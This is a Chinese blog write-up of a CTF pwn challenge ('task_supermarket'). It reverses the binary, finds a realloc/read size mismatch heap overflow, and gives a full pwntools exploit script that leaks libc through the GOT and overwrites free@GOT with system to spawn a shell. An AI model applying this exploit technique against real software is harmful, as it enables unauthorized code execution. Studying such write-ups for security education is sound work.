---
layout: post
title: "[pwn] 国家大学生信息安全实践赛 task_supermarket wp"
categories: "BinarySecurity"
---

环境： kali 2017.2 64位

工具： gdb peda pwntools

[题目下载](https://github.com/pench3r/pench3r.github.io/blob/master/images/201805/task_supermarket?raw=true)

#### 0x01 程序功能分析 ####

题目给的程序为32位elf文件，程序菜单界面如下：

![pwn]({{ '/images/201805/task_supermarket_1_1.png' | prepend: site.baseurl }})

首先分析add_com的函数功能，根据汇编代码写的伪代码如下：

<pre>int check_name(char *buf) {
	for(int i=0; i < 16; ++i) {
		if (*(0x0804b080 +i) == NULL)
			continue;
		if (strcmp(buf, *(0x804b080+i)) == 0)
			return i;
	}
	return -1;
}

int check_space() {
	for (int i=0; i < 16; ++i) {
		if (*(0x0804b080 + i) == NULL)
			return i;
	}
	return -1;
}

void add_com() {
	char buf[16];
	int size;
	for(int i=0; i < 16; ++i) {
		if (*(0x0804b080 + i) == NULL)
			goto create_com;
	}
	puts("no more space");
	return 0;
create_com:
	printf("name:");
	read(STDIN_FILENO, buf, 0x10);
	int index = check_name(buf);
	if (index != -1) {
		puts("name exist");
		return 0;
	}
	index = check_space();
	if (index == -1) {
		puts("no more space");
		return 0;
	}
	char *com = malloc(0x1c);
	*(0x0804b080 + index) = com;
	strcpy(com, buf);	# 保存用户输入的name
	printf("name:%s\n", com);
	printf("price:");
	scanf("%d", &size);
	if (size > 0 && size <= 0x3E7)
		*(*(0x804b080 + index) + 0x10) = size;	# 在0x10偏移处保存price的值
	*(*(0x0804b080 + index) + 0x14) = 0;	
create_descrip_size:
	printf("descrip_size:");
	scanf("%d", &size);
	*(*(0x0804b080 + index) + 0x14) = size;	# 在0x14的偏移处保存descrip_size的值
	if (size > 0 && size <= 0x100) {
		printf("descrip_size:%d\n", *(*(0x0804b080 + index) + 0x14));
	} else {
		goto create_descrip_size;
	}
	char *desc = malloc(size);
	printf("description:");
	*(*(0x804b080 + index) + 0x18) = desc;	# 在0x18的偏移处保存description的地址
	read(STDIN_FILENO, desc, size);
	return 0;
}</pre>

该函数的主要功能，首先遍历检查全局变量`0x804b080`中存放的地址空间是否充足(最多16个)，以及检查用户输入的name是否存在重复，找到可用的空间后，返回index，通过`基址+index`来使用malloc(0x1c)的固定空间，在新申请的空间开头`0xf`个字节中保存用户输入的name, 并在`0x10`偏移处保存用户输入的`price`的值，在`0x14`的偏移处保存`descrip_size`的值，最后通过`descrip_size`的值来`malloc`保存`description`的空间，并将该地址保存在`0x18`偏移的地方。

接着分析函数del_com

<pre>void del_com() {
	char buf[32];
	puts("name:");
	read(STDIN_FILENO, buf, 0x20);
	int index = check_name(buf);
	if (index == -1) {
		puts("not exist");
		return 0;
	}
	if (*(0x804b080 + index) != NULL) {
		*(*(0x804b080 + index) + 0x10) = 0;
		free(*(*(0x804b080 + index) + 0x18));
		free(*(0x804b080 + index));
	}
	*(0x804b080 + index) = 0;
	return 0;
}</pre>

该函数功能比较简单，首先检查用户输入的name是否存在，存在的话再依次free，并不存在漏洞。

函数list_com

<pre>void list_com() {
	char buf[0x311];
	int size;
	memset(buf, 0, 0x311);
	for (int i=0; i < 16; ++i) {
		if (*(0x804b080 + index) != NULL) {
			size = strlen(*(*(0x804b080 + index) + 0x18))
			if (size <= 0x10) {
				char *msg = buf + strlen(buf);
				char *name = *(0x804b080 + index);
				int price = *(*(0x804b080 + index) + 0x10);
				char *des = *(*(0x804b080 + index) + 0x18);
				sprintf(buf, "%s: price.%d, des.%s\n", name, price, des);
			} else {
				char *msg = buf + strlen(buf);
				char *name = *(0x804b080 + index);
				int price = *(*(0x804b080 + index) + 0x10);
				sprintf(msg, "%s: price.%d, des.", name, price);
				char *des = *(*(0x804b080 + index) + 0x18);
				msg = buf + strlen(buf);
				memcpy(msg, des, 0x0d);
				msg = buf + strlen(buf);
				memcpy(msg, "..\n", 4);
			}
		}
	}
	puts("all  commodities info list below:");
	puts(buf);
}</pre>

函数功能也比较简单，遍历`0x804b080`，分别将对应的地址的`name`, `price`, `description`打印出来。

函数change_description函数

<pre>void change_description() {
	char buf[32];
	puts("name:");
	read(STDIN_FILENO, buf, 0x20);
	int index = check_name(buf);
	if (index == -1) {
		puts("not exist");
		return 0;
	}
	int size = 0;
accept_size;
	puts("descrip_size:");
	scanf("%d", &size);
	if (size > 0x100)
		goto accept_size;
	if (size != *(*(0x804b080 + index) + 0x14)) {
		char *com = *(*(0x804b080 + index) + 0x18);
		int desc_size = *(*(0x804b080 + index) + 0x14);
		com = realloc(com, desc_size);
	}
	puts("description:");
	read(0, com, desc_size);	# 漏洞产生的地方
	return 0;
}</pre>

对应的汇编代码如下：

![pwn]({{ '/images/201805/task_supermarket_1_2.png' | prepend: site.baseurl }})

此函数为该题目的漏洞点，当输入的`size`不等于之前保存的`desc_size(*(*(0x804b080 + index) + 0x14))`时触发realloc内存重新分配的大小为用户输入的`size`大小，但是后续会通过`read`来修改`desc`地址保存的内容，可修改的大小为desc_size，但是`desc_size`并非`realloc`时使用的大小，因此当`desc_size`大于用户输入的`size`大小时，造成了内存越界写产生漏洞。

函数change_price函数

<pre>void change_price() {
	char buf[32];
	char buf1[20];
	puts("name:");
	read(STDIN_FILENO, buf, 0x20);
	int index = check_name(buf);
	if (index == -1) {
		puts("not exist");
		return 0;
	}
	if (*(*(0x804b080 + index) + 0x10) <= 0 || *(*(0x804b080 + index) + 0x10) >= 0x3e7) {
		puts("you can't change the price <= 0 or > 99");
		return 0;
	}
	puts("input the value you want to cut or rise");
	int size;
	scanf("%d", &size);
	if (size < -20 || size > 20) {
		puts("you can't change the price");
		return 0;
	}
	*(*(0x804b080 + index) + 0x10) += size;
	if (*(*(0x804b080 + index) + 0x10) > 0 && *(*(0x804b080 + index) + 0x10) <= 0x3e7) {
		return 0;
	}
	puts("bad guy! you destroyed it");
	delete_com();	# 删除该index的com。		
}</pre>

函数功能也相对简单，并没有存在的漏洞。

程序的大致功能已经分析完毕，漏洞点识别到，利用思路：首先创建一个`com`为`'A'`并设置它的`desc_size`为`0x100`，接着使用`change_desc`函数修改`desc_size`的大小为`8`,紧接着创建第二个`com`为`'B'`并设置它的`desc_size`为`0x40`,此时再通过`change_desc`函数的溢出点修改`'A'`的`desc`来覆盖B中的内容，将相邻com中`desc 0x18`处存放的地址换成`puts.got.plt`的地址，然后通过`list_com`的函数就可以泄漏出puts在内存中的地址，然后通过偏移计算出`system`函数的地址；再通过同样的方式将`B`的`desc`地址替换成为`free.got.plt`,再通过`change_desc`直接编辑`'B'`的`desc`，就可以修改`free.got.plt`的函数地址，最后创建`com`为`'/bin/sh\x00'`，然后调用`delete`来指定该名字删除，就可以成功拿到shell

#### 0x02 漏洞利用分析 ####

对于这个漏洞利用的理解最好通过动态调试，来实时查看内存的布局

	add_com('a', 0x10, 0x100, 'AAAA')
	change_desc('a', 8, 'A'*7+'\x00')
	add_com('b', 0x10, 0x40, 'BBBB')

先创建`'a'`的`desc`大小为`0x100`,再修改`'a'`的`desc`的大小为`8`，接着创建`'b'`的`desc`大小为`0x40`.

![pwn]({{ '/images/201805/task_supermarket_2_1.png' | prepend: site.baseurl }})

通过`0x0804b080`可以看到我们已经创建的`'a'`和`'b'`的`com`地址，查看`'a'`的`desc`的地址为`0x08837028`,并且`desc_size`依然为`0x100`,因此在`change_desc`中修改`'b'`中的内容，此时`'b'`中的desc地址为`0x8837058`为了保证程序的一致性，我们就按照图中的内存布局来构造`payload1`

	payload1 = 'A'*7+'\x00' + p32(0) + p32(0x21) + 'b'+3*'\x00' + p32(0)
	payload1 += p32(0) + p32(0) + p32(0x10) + p32(0x40) + p32(puts_got)

构造完毕后，我们发送`payload1`

	change_desc('a', 0x100, payload1)

![pwn]({{ '/images/201805/task_supermarket_2_2.png' | prepend: site.baseurl }})

可以看到成功修改`'b'`中的`desc`地址为`pust.got.plt`，接着调用`list_com()`函数进行地址泄漏

![pwn]({{ '/images/201805/task_supermarket_2_3.png' | prepend: site.baseurl }})

成功泄漏地址`0xf7dacca0`,通过偏移计算`system`地址

	p.recvuntil('b: price.16, des.')
	puts_addr = u32(p.recv(4))
	print "[*] the puts addr is " + hex(puts_addr)
	system_addr = puts_addr - (libc.symbols['puts'] - libc.symbols['system'])
	print "[*] the system addr is " + hex(system_addr)

接着依然通过修改`payload1`将`puts_got`替换为`free_got`,执行完毕后并修改`'b'`就可以修改`free.got.plt`的地址为`system`的地址

	payload2 = 'A'*7+'\x00' + p32(0) + p32(0x21) + 'b'+3*'\x00' + p32(0)
	payload2 += p32(0) + p32(0) + p32(0x10) + p32(0x40) + p32(free_got)
	change_desc('a', 0x100, payload2)
	change_desc('b', 0x40, p32(system_addr))

![pwn]({{ '/images/201805/task_supermarket_2_4.png' | prepend: site.baseurl }})

成功修改为`system`地址，此时我们调用`free`就相当于调用`system`,在`delete`函数会依次调用`free`，所以通过`add_com`来构造`system`的参数，创建`name`和`description`都为`'/bin/sh\x00'`,在执行`delete`时就会成功返回`shell`

完整的脚本如下：

<pre>#!/usr/bin/python

from pwn import *

# for debug
#p = process('./task_supermarket')
#elf = ELF('./task_supermarket')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
gdb.attach(proc.pidof(p)[0], gdbscript="b * 0x08048FF7\nc\n")
context.log_level = 'debug'

def add_com(name, price, desc_size, desc):
  p.recvuntil('your choice>> ')
  p.send('1\n')
  p.recvuntil('name:')
  p.send(name+'\n')
  p.recvuntil('price:')
  p.send(str(price)+'\n')
  p.recvuntil('descrip_size:')
  p.send(str(desc_size)+'\n')
  p.recvuntil('description:')
  p.send(desc+'\n')

def change_desc(name, desc_size, desc):
  p.recvuntil('your choice>> ')
  p.send('5\n')
  p.recvuntil('name:')
  p.send(name+'\n')
  p.recvuntil('descrip_size:')
  p.send(str(desc_size)+'\n')
  p.recvuntil('description:')
  p.send(desc+'\n')

def list_com():
  p.recvuntil('your choice>> ')
  p.send('3\n')

def del_com(name):
  p.recvuntil('your choice>> ')
  p.send('2\n')
  p.recvuntil('name:')
  p.send(name+'\n')


if __name__ == '__main__':
  puts_got = elf.got['puts']
  free_got = elf.got['free']
  print "Begin..."
  add_com('a', 0x10, 0x100, 'AAAA')
  change_desc('a', 8, 'A'*7+'\x00')
  add_com('b', 0x10, 0x40, 'BBBB')
  list_com()
  payload1 = 'A'*7+'\x00' + p32(0) + p32(0x21) + 'b'+3*'\x00' + p32(0)
  payload1 += p32(0) + p32(0) + p32(0x10) + p32(0x40) + p32(puts_got)
  change_desc('a', 0x100, payload1)
  list_com()
  p.recvuntil('b: price.16, des.')
  puts_addr = u32(p.recv(4))
  print "[*] the puts addr is " + hex(puts_addr)
  system_addr = puts_addr - (libc.symbols['puts'] - libc.symbols['system'])
  print "[*] the system addr is " + hex(system_addr)
  payload2 = 'A'*7+'\x00' + p32(0) + p32(0x21) + 'b'+3*'\x00' + p32(0)
  payload2 += p32(0) + p32(0) + p32(0x10) + p32(0x40) + p32(free_got)
  change_desc('a', 0x100, payload2)
  change_desc('b', 0x40, p32(system_addr))
  add_com('/bin/sh\x00', 0x10, 0x20, '/bin/sh\x00')
  del_com('/bin/sh\x00')
  p.interactive()</pre>

运行截图：

![pwn]({{ '/images/201805/task_supermarket_2_5.png' | prepend: site.baseurl }})

#### 0x03 总结 ####

第一次拿到题目，费劲的分析每个程序功能，没有第一时间判断程序版本，直接使用IDA64来分析，花的时间比较多，而且该漏洞在汇编代码中很容易被忽略，所以第一次并没有自己发现这个点，后来是群里有人分享脚本，又回头分析代码发现了漏洞。

- 先冷静分析程序版本，使用对应IDA可以使用F5查看伪代码
- 在分析汇编程序的时候需要精神高度集中，并随手将对应的变量注释出来

KEEP Going!!! :P



